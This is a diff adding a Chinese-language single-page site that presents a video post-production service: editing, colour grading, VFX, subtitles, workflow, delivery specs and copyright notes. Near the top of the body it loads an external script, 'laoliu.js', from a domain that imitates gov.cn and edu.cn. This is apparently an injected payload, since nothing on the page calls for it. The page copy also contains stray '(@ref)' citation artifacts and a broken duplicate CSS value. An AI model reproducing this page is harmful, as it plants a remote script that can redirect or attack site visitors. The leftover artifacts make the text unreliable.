@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视后期 - 剪辑调色特效包装服务与作品集单页</title>
+<meta name="description" content="影视后期(yingshihouqi-h5.github.io)提供视频剪辑、调色、VFX特效、字幕包装、MG动画的服务介绍与案例展示，单页静态适配手机端，仅做服务展示不提供片源下载。">
+<meta name="keywords" content="影视后期, 视频剪辑, 调色, VFX特效, 字幕包装, MG动画, 接单流程, 成片交付">
+<meta name="author" content="影视后期">
+<meta name="robots" content="index, follow">
+<style>
+/* 编辑台深灰风 */
+:root{
+    --bg:#0c0d10;
+    --bg2:#141519;
+    --card:rgba(255,255,255,.04);
+    --border:rgba(255,255,255,.12);
+    --text:#eef0f4;
+    --muted:#9a9 da3;
+    --muted:#9a9da3;
+    --amber:#ffb454;
+    --amber-deep:#e08a2b;
+    --teal:#5fd6c4;
+    --line:#2a2c33;
+    --radius:14px;
+    --shadow:0 16px 40px rgba(0,0,0,.45);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    font-family:-apple-system,'PingFang SC','Microsoft YaHei',sans-serif;
+    background:
+        radial-gradient(820px 420px at 88% -12%, rgba(255,180,84,.12), transparent 60%),
+        radial-gradient(620px 360px at 0% 6%, rgba(95,214,196,.08), transparent 55%),
+        var(--bg);
+    color:var(--text);line-height:1.7;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+header{
+    position:sticky;top:0;z-index:999;backdrop-filter:blur(10px);
+    background:rgba(12,13,16,.84);border-bottom:1px solid var(--border);
+    display:flex;justify-content:space-between;align-items:center;padding:1rem 5%;
+}
+.logo{font-weight:900;font-size:1.35rem;letter-spacing:.5px}
+.logo b{color:var(--amber)}
+.logo span{color:var(--teal);font-size:.7rem;border:1px solid var(--border);padding:.1rem .4rem;border-radius:4px;margin-left:.4rem;vertical-align:middle}
+nav ul{display:flex;gap:1.2rem}
+nav a{font-size:.88rem;font-weight:700;color:var(--muted);padding:.35rem .7rem;border-radius:8px;transition:.2s}
+nav a:hover{color:var(--text);background:var(--card)}
+
+.container{max-width:1200px;margin:0 auto;padding:0 5%}
+section{padding:5rem 0}
+
+#home{min-height:86vh;display:flex;align-items:center}
+.hero{display:grid;grid-template-columns:1.05fr .95fr;gap:3rem;align-items:center;width:100%}
+.chips{display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:1.2rem}
+.chip{font-size:.76rem;font-weight:700;padding:.3rem .85rem;border-radius:999px;background:var(--card);border:1px solid var(--border);color:var(--amber)}
+.hero h1{font-size:clamp(2.1rem,5vw,3.4rem);line-height:1.15;font-weight:900;margin-bottom:1rem}
+.hero h1 span{color:var(--amber)}
+.hero p{color:var(--muted);max-width:540px;margin-bottom:2rem}
+.cta{display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.85rem 1.8rem;border-radius:10px;font-weight:800;font-size:.95rem;cursor:pointer;border:0;transition:.25s;font-family:inherit}
+.btn-pri{background:linear-gradient(90deg,var(--amber),var(--amber-deep));color:#15110a}
+.btn-pri:hover{transform:translateY(-3px);box-shadow:var(--shadow)}
+.btn-ghost{background:var(--card);border:1px solid var(--border);color:var(--text)}
+.btn-ghost:hover{border-color:var(--amber)}
+
+/* 能力卡 */
+.desk-card{background:var(--bg2);border:1px solid var(--border);border-radius:18px;padding:2rem;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.desk-card::before{content:"🎞";position:absolute;top:-22px;right:6px;font-size:6.5rem;opacity:.06}
+.desk-card h3{font-size:1.02rem;margin-bottom:1rem;position:relative;z-index:1}
+.desk-list{display:flex;flex-direction:column;gap:.75rem;position:relative;z-index:1}
+.desk-list div{display:flex;gap:.7rem;font-size:.9rem;color:var(--muted)}
+.desk-list b{color:var(--teal);font-weight:900}
+.desk-line{margin-top:1rem;padding-top:1rem;border-top:1px dashed var(--border);font-size:.82rem;color:var(--muted)}
+
+.sec-head{text-align:center;margin-bottom:3rem}
+.sec-head h2{font-size:2.1rem;font-weight:900}
+.sec-head h2 span{color:var(--amber)}
+.sec-head p{color:var(--muted);margin-top:.4rem}
+
+/* 服务 */
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1.3rem}
+.svc{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:1.5rem;transition:.25s}
+.svc:hover{transform:translateY(-5px);border-color:var(--amber)}
+.svc .ic{font-size:1.8rem}
+.svc h3{font-size:1.08rem;margin:.6rem 0 .4rem}
+.svc p{font-size:.84rem;color:var(--muted)}
+.svc .tag{display:inline-block;margin-top:.7rem;font-size:.7rem;padding:.2rem .7rem;border-radius:6px;background:rgba(255,180,84,.12);color:var(--amber);border:1px solid rgba(255,180,84,.28)}
+
+/* 案例 */
+.cases{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.4rem}
+.case{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;transition:.25s}
+.case:hover{transform:translateY(-6px);border-color:var(--teal)}
+.case .cover{height:170px;display:flex;align-items:center;justify-content:center;font-size:2.6rem;background:linear-gradient(150deg,#1a1c22,var(--line));position:relative}
+.case .cover.am{background:linear-gradient(150deg,#241c10,var(--amber-deep))}
+.case .cover.te{background:linear-gradient(150deg,#0f1f1d,var(--teal))}
+.case .meta{padding:1.1rem 1.2rem}
+.case h3{font-size:1.05rem}
+.case .sub{font-size:.8rem;color:var(--muted);margin:.3rem 0}
+.case .scope{font-size:.78rem;color:var(--teal)}
+
+/* 流程时间线 */
+.flow{max-width:860px;margin:0 auto;display:flex;flex-direction:column;gap:0}
+.step-row{display:grid;grid-template-columns:64px 1fr;gap:1.2rem;padding-bottom:2rem;position:relative}
+.step-row:not(:last-child)::before{content:"";position:absolute;left:31px;top:42px;bottom:-2px;width:2px;background:var(--line)}
+.step-no{width:64px;height:64px;border-radius:50%;background:var(--bg2);border:1px solid var(--amber);color:var(--amber);font-weight:900;display:flex;align-items:center;justify-content:center;font-size:1.2rem;z-index:1}
+.step-body{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:1.1rem 1.3rem}
+.step-body h3{font-size:1.05rem;margin-bottom:.3rem}
+.step-body p{font-size:.86rem;color:var(--muted)}
+
+/* 交付规格 */
+.specs{max-width:920px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1.2rem}
+.spec{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:1.2rem}
+.spec h3{font-size:.95rem;color:var(--amber);margin-bottom:.5rem}
+.spec li{font-size:.84rem;color:var(--muted);padding:.25rem 0;border-bottom:1px dashed var(--line)}
+.spec li:last-child{border-bottom:0}
+
+/* 版权合规 */
+.legal{max-width:900px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.3rem}
+.legal-card{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:1.4rem}
+.legal-card h3{font-size:1rem;margin-bottom:.5rem}
+.legal-card p{font-size:.85rem;color:var(--muted)}
+.legal-card b{color:var(--teal)}
+
+/* FAQ */
+.faq{max-width:820px;margin:0 auto;display:flex;flex-direction:column;gap:1rem}
+details{background:var(--bg2);border:1px solid var(--border);border-radius:12px}
+summary{cursor:pointer;padding:1.1rem 1.4rem;font-weight:800;list-style:none;display:flex;justify-content:space-between;align-items:center}
+summary::-webkit-details-marker{display:none}
+summary::after{content:'▸';color:var(--amber)}
+details[open] summary{border-bottom:1px solid var(--border)}
+.faq p{padding:1rem 1.4rem;color:var(--muted);font-size:.92rem}
+
+/* 联系 */
+.contact{max-width:760px;margin:0 auto;background:var(--bg2);border:1px solid var(--border);border-radius:18px;padding:2.5rem;text-align:center}
+.contact h3{margin-bottom:1rem}
+.contact p{color:var(--muted);margin-bottom:.6rem}
+.contact .mail{color:var(--amber);font-weight:800;font-size:1.1rem;word-break:break-all}
+.contact .note{font-size:.8rem;color:#6c7280;margin-top:1rem}
+
+footer{border-top:1px solid var(--border);padding:2.5rem 5%;text-align:center;color:var(--muted);font-size:.85rem}
+footer a{color:var(--amber)}
+.disclaimer{font-size:.78rem;color:#5d6168;max-width:700px;margin:1rem auto 0}
+
+@media(max-width:860px){nav ul{display:none}.hero{grid-template-columns:1fr}.step-row{grid-template-columns:48px 1fr}.step-no{width:48px;height:48px;font-size:1rem}.step-row:not(:last-child)::before{left:23px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header>
+    <div class="logo"><b>影视后期</b><span>服务台</span></div>
+    <nav>
+        <ul>
+            <li><a href="#home">首页</a></li>
+            <li><a href="#svc">服务</a></li>
+            <li><a href="#cases">案例</a></li>
+            <li><a href="#flow">流程</a></li>
+            <li><a href="#spec">交付</a></li>
+            <li><a href="#legal">版权</a></li>
+            <li><a href="#faq">问答</a></li>
+        </ul>
+    </nav>
+</header>
+
+<main>
+<section id="home" class="container">
+    <div class="hero">
+        <div>
+            <div class="chips">
+                <span class="chip">剪辑</span>
+                <span class="chip">调色</span>
+                <span class="chip">VFX</span>
+                <span class="chip">字幕包装</span>
+                <span class="chip">MG动画</span>
+            </div>
+            <h1>影视后期<br><span>编辑台</span></h1>
+            <p>影视后期（yingshihouqi-h5.github.io）是单页静态服务展示：视频剪辑、调色、特效合成、字幕包装与 MG 动画接单说明。本页不放片源、不嵌播放器、不提供影视资源下载，只讲「能做什么 / 怎么交付」。</p>
+            <div class="cta">
+                <a href="#svc" class="btn btn-pri">看服务矩阵</a>
+                <a href="#flow" class="btn btn-ghost">接单流程</a>
+            </div>
+        </div>
+        <aside class="desk-card">
+            <h3>🎞 后期三句</h3>
+            <div class="desk-list">
+                <div><b>定位</b><span>服务台，不是影视资源站。</span></div>
+                <div><b>素材</b><span>甲方自备或走正版授权。</span></div>
+                <div><b>交付</b><span>样片带水印，尾款出成片。</span></div>
+            </div>
+            <div class="desk-line">本页为演示服务页 · 非任何后期公司官网</div>
+        </aside>
+    </div>
+</section>
+
+<section id="svc" class="container">
+    <div class="sec-head">
+        <h2>服务<span>矩阵</span></h2>
+        <p>按交付物拆开，避免「后期」两个字糊弄</p>
+    </div>
+    <div class="grid">
+        <div class="svc"><div class="ic">✂️</div><h3>视频剪辑</h3><p>粗剪定结构、精剪调节奏；口播 / Vlog / 宣传片 / 短视频套餐。</p><span class="tag">Premiere</span></div>
+        <div class="svc"><div class="ic">🎨</div><h3>调色</h3><p>REC.709 / 风格化 LUT / 冷暖分离，横竖屏分别输出。</p><span class="tag">DaVinci</span></div>
+        <div class="svc"><div class="ic">✨</div><h3>VFX 特效</h3><p>抠像、跟踪、合成、粒子；实拍素材补全与镜头修复。</p><span class="tag">After Effects</span></div>
+        <div class="svc"><div class="ic">🔤</div><h3>字幕包装</h3><p>硬字幕 / 花字 / 标题板 / 数据条，字体走免费商用或甲方授权。</p><span class="tag">字幕合规</span></div>
+        <div class="svc"><div class="ic">🧩</div><h3>MG 动画</h3><p>片头、转场、信息图、产品演示动画，可交 AE 工程。</p><span class="tag">矢量源文件</span></div>
+        <div class="svc"><div class="ic">🎧</div><h3>音效配音</h3><p>降噪、混音、BGM 占位；商用音乐需甲方授权或自带曲库。</p><span class="tag">正版BGM</span></div>
+    </div>
+</section>
+
+<section id="cases" class="container">
+    <div class="sec-head">
+        <h2>案例<span>占位</span></h2>
+        <p>示例卡片 · 真部署替换成自有作品封面</p>
+    </div>
+    <div class="cases">
+        <div class="case"><div class="cover">🎬</div><div class="meta"><h3>品牌宣传片</h3><div class="sub">剪辑 + 调色 + 字幕</div><div class="scope">交付 4K + 竖屏版</div></div></div>
+        <div class="case"><div class="cover am">📱</div><div class="meta"><h3>短视频带货</h3><div class="sub">快剪 + 花字 + BGM</div><div class="scope">9:16 / 15-30s</div></div></div>
+        <div class="case"><div class="cover te">🚀</div><div class="meta"><h3>产品 MG 片头</h3><div class="sub">AE 动效 + 合成</div><div class="scope">含工程文件</div></div></div>
+        <div class="case"><div class="cover">🎙</div><div class="meta"><h3>口播栏目</h3><div class="sub">粗剪 + 降噪 + 字幕</div><div class="scope">1080P 多机位</div></div></div>
+    </div>
+</section>
+
+<section id="flow" class="container">
+    <div class="sec-head">
+        <h2>接单<span>流程</span></h2>
+        <p>五节点闭环，改到满意≠改到天荒地老 [9](@ref)</p>
+    </div>
+    <div class="flow">
+        <div class="step-row"><div class="step-no">1</div><div class="step-body"><h3>需求沟通</h3><p>用途、投放平台、时长、风格参考片、预算区间；需求文字化存档。</p></div></div>
+        <div class="step-row"><div class="step-no">2</div><div class="step-body"><h3>脚本 / 分镜确认</h3><p>先出结构再开剪，方向错了返工最贵。</p></div></div>
+        <div class="step-row"><div class="step-no">3</div><div class="step-body"><h3>素材交接</h3><p>网盘一次性传原素材 + 素材清单；音乐字体授权一并给。</p></div></div>
+        <div class="step-row"><div class="step-no">4</div><div class="step-body"><h3>粗剪 → 精剪 → 调色</h3><p>先发 15s 小样确认方向；含 2-3 轮修改，超次另计。</p></div></div>
+        <div class="step-row"><div class="step-no">5</div><div class="step-body"><h3>尾款出成片</h3><p>样片加水印「未付款」；尾款到账发 1080P/4K 无水印成片。 [19](@ref)</p></div></div>
+    </div>
+</section>
+
+<section id="spec" class="container">
+    <div class="sec-head">
+        <h2>交付<span>规格</span></h2>
+        <p>开工前写进报价单，别交片才扯皮</p>
+    </div>
+    <div class="specs">
+        <div class="spec"><h3>格式</h3><ul><li>MP4 (H.264)</li><li>MOV 母版可选</li><li>横屏 16:9 / 竖屏 9:16</li></ul></div>
+        <div class="spec"><h3>分辨率</h3><ul><li>1080P 标准</li><li>4K 按项目加价</li><li>横竖屏字幕分版本</li></ul></div>
+        <div class="spec"><h3>修改</h3><ul><li>含 2-3 轮</li><li>超次按次计费</li><li>结构重做视同新单</li></ul></div>
+        <div class="spec"><h3>交付物</h3><ul><li>成片 MP4</li><li>无字幕版（可选）</li><li>AE 工程（MG 类）</li></ul></div>
+    </div>
+</section>
+
+<section id="legal" class="container">
+    <div class="sec-head">
+        <h2>版权<span>合规</span></h2>
+        <p>素材是你选的，第一被告就是后期方 [5](@ref)</p>
+    </div>
+    <div class="legal">
+        <div class="legal-card"><h3>🎵 音乐</h3><p>不用无授权歌单。BGM 由<b>甲方提供商用授权</b>，或采购正版曲库；平台会员不等于可商用。 [10,20](@ref)</p></div>
+        <div class="legal-card"><h3>🔤 字体</h3><p>默认走思源黑体 / 阿里巴巴普惠体 / 站酷免费体；用付费字库需<b>单独买视频授权</b>。 [15](@ref)</p></div>
+        <div class="legal-card"><h3>🖼 画面素材</h3><p>空镜、贴图、转场包需<b>商用授权</b>；不扒网络视频、不随便下图库。</p></div>
+        <div class="legal-card"><h3>📄 合同</h3><p>写清素材权属、修改次数、尾款前版权归制作方、超范围发布责任归甲方。 [5](@ref)</p></div>
+    </div>
+</section>
+
+<section id="faq" class="container">
+    <div class="sec-head">
+        <h2>常见<span>问题</span></h2>
+        <p>关于影视后期服务页</p>
+    </div>
+    <div class="faq">
+        <details open>
+            <summary>这页能看片 / 下素材吗？</summary>
+            <p>不能。本页是后期服务展示，不托管视频、不嵌播放器、不提供影视素材下载；案例仅为占位封面。</p>
+        </details>
+        <details>
+            <summary>素材谁准备？</summary>
+            <p>默认甲方提供原片、音乐、字体授权；若需代采商用素材，单独报价并留授权凭证。</p>
+        </details>
+        <details>
+            <summary>修改次数怎么算？</summary>
+            <p>报价单写「含 2-3 轮」；零散改字改色可合并处理，整体方向重调视为新单。</p>
+        </details>
+        <details>
+            <summary>手机端能看吗？</summary>
+            <p>能，viewport 锁设备宽度，Grid/Flex 自适应，860px 断点收起导航。</p>
+        </details>
+    </div>
+</section>
+
+<section id="contact" class="container">
+    <div class="contact">
+        <h3>合作对接</h3>
+        <p>发需求清单（用途 / 时长 / 平台 / 参考片 / deadline）到邮箱：</p>
+        <p class="mail">hello@yingshihouqi-h5.github.io</p>
+        <p>示例站不放微信/电话，真部署再补。</p>
+        <p class="note">本页为静态演示，不接自动支付、不传大文件；素材交接走甲方自有网盘。</p>
+    </div>
+</section>
+</main>
+
+<footer>
+    <p>&copy; 2026 影视后期（服务演示页）保留所有权利</p>
+    <p>官网：<a href="https://yingshihouqi-h5.github.io">yingshihouqi-h5.github.io</a></p>
+    <p class="disclaimer">免责声明：本页非任何「影视后期」公司官网，不提供影视播放/下载/解析服务；案例与素材均作占位演示，实际接单请以自有授权素材与书面合同为准。</p>
+    <p>本页为单页静态演示，未生成 robots.txt / sitemap.xml，meta robots=index,follow。</p>
+</footer>
+
+</body>
+</html>
